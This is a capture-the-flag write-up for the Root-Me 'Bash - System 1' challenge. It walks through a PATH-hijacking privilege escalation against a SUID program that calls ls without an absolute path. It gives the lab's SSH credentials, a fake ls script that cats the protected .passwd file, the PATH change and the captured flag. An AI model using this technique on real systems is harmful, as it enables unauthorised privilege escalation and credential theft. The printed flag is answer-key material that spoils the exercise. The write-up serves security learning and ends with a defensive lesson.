# Bash - System 1 - Find your path, padawan!
## 1. SSH into the challenge
```bash
ssh -p 2222 app-script-ch11@challenge02.root-me.org
```
Password:
```bash
app-script-ch11
```
## 2. Find the challenge executable

Once connected, Look for the executable, likely something such as ch11.
Check it:
```bash
ls -l /challenge/app-script/ch11/
```
## 3. Understand the vulnerability

The source contains:
```c
system("ls /challenge/app-script/ch11/.passwd");
```
The intended ls is probably something like:
```c
/bin/ls
```
But the program doesn't specify /bin/ls.

So we can create our own executable named ls, put its directory at the beginning of PATH, and then run the vulnerable SUID program.

The program also has:
```c
setreuid(geteuid(), geteuid());
```
This means the program runs with its effective privileged UID. Therefore, our malicious ls will be executed with those privileges.

## 4. Create a fake ls

Make a directory in /tmp:
```bash
mkdir /tmp/mybin
```
Create a fake ls:
```bash
nano /tmp/mybin/ls
```
Put:
```bash
#!/bin/bash
cat /challenge/app-script/ch11/.passwd
```
Save and exit by pressing CtrlX , Y and Enter.
Then make it executable:
```bash
chmod +x /tmp/mybin/ls
```
## 5. Put your directory first in PATH

Run:
```bash
export PATH=/tmp/mybin:$PATH
```
Verify:
```bash
which ls
```
It should return:
```bash
/tmp/mybin/ls
```
6. Run the vulnerable program

Instead of using ls now, use an absolute path to inspect/run the challenge:
```bash
/challenge/app-script/ch11/ch11
```
When it executes:
```c
system("ls /challenge/app-script/ch11/.passwd");
```
the shell searches PATH and finds:
```bash
/tmp/mybin/ls
```
instead of the real /bin/ls.

Your fake ls executes:
```bash
cat /challenge/app-script/ch11/.passwd
```
and should print the password/flag.
```bash
!oPe96a/.s8d5
```
The attack chain
Vulnerable SUID program
        │
        ▼
system("ls /challenge/app-script/ch11/.passwd")
        │
        ▼
Shell searches PATH for "ls"
        │
        ▼
/tmp/mybin/ls   ← our malicious executable
        │
        ▼
cat /challenge/app-script/ch11/.passwd
        │
        ▼
       FLAG

Key lesson: Never rely on system() with commands that aren't specified using absolute paths, especially inside a privileged/SUID program.